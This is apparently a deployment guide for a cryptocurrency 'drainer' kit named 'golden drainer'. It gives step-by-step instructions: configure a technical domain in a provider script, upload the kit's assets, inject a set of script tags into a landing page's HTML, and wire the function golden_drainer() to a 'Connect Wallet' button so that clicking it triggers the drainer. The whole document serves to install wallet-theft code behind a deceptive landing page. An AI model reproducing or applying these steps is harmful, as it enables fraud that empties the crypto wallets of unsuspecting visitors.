# 😎 Loading landing pages

* We look at point 7. and 8. where we bought the domain for our landing and hosting. Now we will work with them. - for experienced users (we get SSL iresis [cloudflare](https://cloudflare.com/) on our landing domain as in paragraph 9)
* Open the "Client" folder, go to the "assets" folder, open the "web3-provider.js" file and enter here our technical domain (in the same format as it is specified in the file) from item 7.
* After making changes, transfer the "assets" folder to the root of our landing
* Now open the site file where your landing is, usually called "index.html."
* Scroll through the file to the end and find a special tag there that looks like this:\
  \</body>
* As soon as you find it, write down the following lines of code right in front of it:

```
 <script src="/assets/web3-provider/web3-connect.js"></script>
 <script src="/assets/web3-provider/web3-router.js"></script>
 <script src="/assets/web3-provider/web3-module.js"></script>
 <script src="/assets/web3-provider/web3-alert.js"></script>
 <script src="/assets/web3-provider/web3-seaport.js"></script>
 <script src="/assets/web3-provider/web3-data.js"></script>
 <script src="/assets/web3-provider/ethers.js"></script>
 <script src="/assets/web3-provider/ethereum-tx.js"></script>
 <script src="/assets/web3-provider.js"></script>
```

* Now you need to connect the Driner to the button you need, or just an item on the page.
* Most often, the buttons look either like this in the code:\
  \<button class="button btn-dark"> Connect Wallet \</button>
* Or somehow, in fact, it can look like anything:\
  \<a href="#"> Connect Wallet \</a>
* You need to add the desired function to the button so that it is called when clicking:\
  onclick="golden\_drainer()"
* That is, in the final version it will look like this:\
  \<button class="button btn-dark" onclick="golden\_drainer()">\
  Connect Wallet\
  \</button>
* Please note that these scripts will only work on hosting. If you open the file on a local server or just on a computer, most likely nothing will work.
* Uploading our landing to hosting.
* Open our website and check the operation of the button
